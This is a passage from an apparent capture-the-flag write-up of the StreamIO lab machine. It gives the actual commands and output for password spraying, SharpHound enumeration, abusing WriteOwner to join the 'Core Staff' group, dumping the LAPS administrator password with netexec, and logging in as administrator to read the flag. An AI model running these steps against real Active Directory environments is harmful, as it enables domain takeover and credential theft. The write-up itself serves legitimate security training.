SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
```

Seems like the login is successful for the user `JDgodd`. Unfortunately the user `JDgodd` does not have a permission over Winrm. Now I'll get `SharpHound.exe` on the target and perform further enumeration.
###### `SharpHound to collect the data`
```
*Evil-WinRM* PS C:\ProgramData> .\SharpHound.exe
2024-09-11T06:55:22.9033030-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-09-11T06:55:23.0750099-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-09-11T06:55:23.1062941-07:00|INFORMATION|Initializing SharpHound at 6:55 AM on 9/11/2024
2024-09-11T06:55:23.2625066-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for streamIO.htb : DC.streamIO.htb
2024-09-11T06:55:23.2937699-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-09-11T06:55:23.4968990-07:00|INFORMATION|Beginning LDAP search for streamIO.htb
2024-09-11T06:55:23.5437659-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-09-11T06:55:23.5593852-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-09-11T06:55:53.7000997-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 34 MB RAM
2024-09-11T06:56:12.5125030-07:00|WARNING|[CommonLib LDAPUtils]Exception in LDAP loop for (&(objectclass=trusteddomain)(securityidentifier=S-1-5-21-1470860369-1569627196-4264678630)) and Default Domain
System.DirectoryServices.Protocols.DirectoryOperationException: The server is busy.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__34.MoveNext()
2024-09-11T06:56:12.7781289-07:00|INFORMATION|Consumers finished, closing output channel
2024-09-11T06:56:12.8250096-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-09-11T06:56:13.0593900-07:00|INFORMATION|Status: 97 objects finished (+97 1.979592)/s -- Using 42 MB RAM
2024-09-11T06:56:13.0593900-07:00|INFORMATION|Enumeration finished in 00:00:49.5769777
2024-09-11T06:56:13.1531692-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
 58 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-09-11T06:56:13.1687674-07:00|INFORMATION|SharpHound Enumeration Completed at 6:56 AM on 9/11/2024! Happy Graphing!
```

![](StreamIO_BloodHound.png)

###### `Importing Powerview.ps1`
```
*Evil-WinRM* PS C:\ProgramData> copy \\10.10.14.8\share\powerview.ps1 .
*Evil-WinRM* PS C:\ProgramData> Import-Module .\powerview.ps1
```

###### `Setting up Credential Object $Cred for user JDgodd`
```
*Evil-WinRM* PS C:\ProgramData> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\ProgramData> $user = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

###### `Adding user to the Group when the user has WriteOwner Permission`
```
*Evil-WinRM* PS C:\ProgramData> Add-DomainObjectAcl -Credential $user -TargetIdentity "Core Staff" -PrincipalIdentity "streamio.htb\JDgodd"
*Evil-WinRM* PS C:\ProgramData> Add-DomainGroupMember -Credential $user -Identity "Core Staff" -Member "streamio.htb\JDgodd"
```

`JDgodd now part of Core Staff`
```
*Evil-WinRM* PS C:\ProgramData> net user JDgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/11/2024 7:08:26 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

###### `Local Administration Password Solution (LAPS)`
```
What is Microsoft LAPS? Microsoft's "Local Administrator Password Solution" (LAPS) **provides management of local administrator account passwords for domain-joined computers**. Passwords are randomized and stored in Active Directory (AD), protected by ACLs, so only eligible users can read it or request its reset.
```

we can now read the LAPS password from the `ms-MCS-AdmPwd` property on the computer object. 
```
*Evil-WinRM* PS C:\ProgramData> Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $user
DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

As you can see in the output above there's no password. So I switch  to `netexec`

###### `Netexec to read LAPS password`
```
─# netexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds                           
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         10.10.11.158    445    DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC         [-] DC\administrator:heU74l%563.bA( STATUS_LOGON_FAILURE
```

```
# evil-winrm -i 10.10.11.158 -u administrator -p 'heU74l%563.bA('
```

But the root flag is in User `Martin's` Folder.
```
*Evil-WinRM* PS C:\Users\Martin\Desktop> type root.txt
449ffb
```

Get your flag